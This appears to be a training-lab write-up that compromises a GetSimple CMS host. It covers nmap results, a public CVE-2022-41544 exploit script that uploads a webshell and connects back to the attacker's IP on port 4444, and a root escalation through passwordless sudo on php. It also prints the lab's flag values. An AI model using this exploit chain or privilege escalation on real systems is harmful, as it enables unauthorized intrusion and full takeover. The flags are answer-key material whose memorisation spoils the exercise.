# Section 23: Knowledge Check

Module: 02. Getting Started

---

## NMAP Emuneration
```bash
PORT     STATE    SERVICE       VERSION
22/tcp   open     ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4c:73:a0:25:f5:fe:81:7b:82:2b:36:49:a5:4d:c8:5e (RSA)
|   256 e1:c0:56:d0:52:04:2f:3c:ac:9a:e7:b1:79:2b:bb:13 (ECDSA)
|_  256 52:31:47:14:0d:c3:8e:15:73:e3:c4:24:a2:3a:12:77 (ED25519)
80/tcp   open     http          Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Welcome to GetSimple! - gettingstarted
| http-robots.txt: 1 disallowed entry 
|_/admin/
1113/tcp filtered ltp-deepspace
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## Web Emuneration
Found GetSimple CMS, visit `/admin` also display a login form, searching online and saw a really popular vulnerability Unauthenticated RCE [CVE-2022-41544](https://nvd.nist.gov/vuln/detail/CVE-2022-41544), use the script from [Exploit-DB](https://www.exploit-db.com/exploits/51475)
## Web Exploiting
```bash
┌─[eu-academy-1]─[10.10.15.161]─[htb-ac-2162140@htb-sqrb6cwqny]─[~]
└──╼ [★]$ python3 CVE-2022-41544.py 10.129.129.0 / 10.10.15.161:4444 admin

 CCC V     V EEEE      22   000   22   22      4  4  11  5555 4  4 4  4 
C    V     V E        2  2 0  00 2  2 2  2     4  4 111  5    4  4 4  4 
C     V   V  EEE  ---   2  0 0 0   2    2  --- 4444  11  555  4444 4444 
C      V V   E         2   00  0  2    2          4  11     5    4    4 
 CCC    V    EEEE     2222  000  2222 2222        4 11l1 555     4    4 
 
[+] The version 3.3.15 is vulnerable to CVE-2022-41544
[+] API key obtained: 4f399dc72ff8e619e327800f851e9986
[+] CSRF token obtained
[+] Shell uploaded successfully!
[+] Webshell triggered successfully!
```
## Get user flag
```bash
www-data@gettingstarted:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@gettingstarted:/var/www/html$ ls /home
mrb3n
www-data@gettingstarted:/var/www/html$ ls -la /home
total 12
drwxr-xr-x  3 root  root  4096 Mar 12  2024 .
drwxr-xr-x 20 root  root  4096 Mar 12  2024 ..
drwxr-xr-x  3 mrb3n mrb3n 4096 Mar 12  2024 mrb3n
www-data@gettingstarted:/var/www/html$ ls -la /home/mrb3n/
total 40
drwxr-xr-x 3 mrb3n mrb3n  4096 Mar 12  2024 .
drwxr-xr-x 3 root  root   4096 Mar 12  2024 ..
lrwxrwxrwx 1 mrb3n mrb3n     9 Feb  9  2021 .bash_history -> /dev/null
-rw-r--r-- 1 mrb3n mrb3n   220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 mrb3n mrb3n  3771 Feb 25  2020 .bashrc
drwx------ 2 mrb3n mrb3n  4096 Mar 12  2024 .cache
-rw-r--r-- 1 mrb3n mrb3n   807 Feb 25  2020 .profile
-rw-r--r-- 1 mrb3n mrb3n     0 Feb  9  2021 .sudo_as_admin_successful
-rw------- 1 mrb3n mrb3n 10332 May  7  2021 .viminfo
-rw-rw-r-- 1 mrb3n mrb3n    33 Feb 16  2021 user.txt
www-data@gettingstarted:/var/www/html$ cat /home/mrb3n/user.txt 
7002d65b149b0a4d19132a66feed21d8
www-data@gettingstarted:/var/www/html$ 
```
## Privilege Escalation
```bash
www-data@gettingstarted:/var/www/html$ sudo -l
Matching Defaults entries for www-data on gettingstarted:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on gettingstarted:
    (ALL : ALL) NOPASSWD: /usr/bin/php
```
`www-data` can run `php` with no password needed on any user or group even `root`.
## Get root flag
```bash
www-data@gettingstarted:/var/www/html$ sudo php -r "system('/bin/bash');"
root@gettingstarted:/var/www/html# id
uid=0(root) gid=0(root) groups=0(root)
root@gettingstarted:/var/www/html# cat /root/root.txt
f1fba6e9f71efb2630e6e34da6387842
```

---

[Back to Module Index](./README.md)